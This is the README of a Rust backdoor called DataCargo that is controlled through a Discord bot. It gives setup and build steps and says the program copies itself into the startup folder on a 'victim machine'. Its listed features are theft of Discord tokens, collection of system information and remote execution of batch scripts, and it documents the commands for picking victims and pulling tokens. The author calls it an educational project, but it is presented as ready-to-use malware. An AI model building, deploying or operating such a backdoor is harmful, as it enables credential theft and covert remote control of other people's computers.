# DataCargo

Simple backdoor written in Rust based on a Discord bots.

## Usage

All you have to do is to change three constants in main.rs 
- BOT_TOKEN
- LOGS_CHANNEL_ID
- PROTECTED_UUIDS

And then simply compile it.
```bash
cargo rustc --release
```

## Description

This backdoor is one of my educational projects to learn Rust. <br>
It's based on the Discord bots because cmmon, it's hilarious. <br>
Run it on the victim machine and it will copy itself into startup folder.

## Features
- Get system info
- Discord token grabber
- Execute batch scripts *(No Admin)*

## Missing Features
- Execute batch scripts *(Admin)*
- Record the screen
- Install external software
- Check tokens validation
- Control mouse and keyboard
- Unique SID *(Selection ID)*

## Commands
<br>
**Without selected victim:** <br>
`.s <UUID>` - select the victim by their UUID <br>
`.victims` - show all the available victims <br>
<br>
**With selected victim:** <br>
`.victim` - show the selected victim <br>
`.tokens`- get all the Discord tokens. <br>
<br>
execute the batch script:
```
.script `­``cmd
@echo off
cd
``­`
```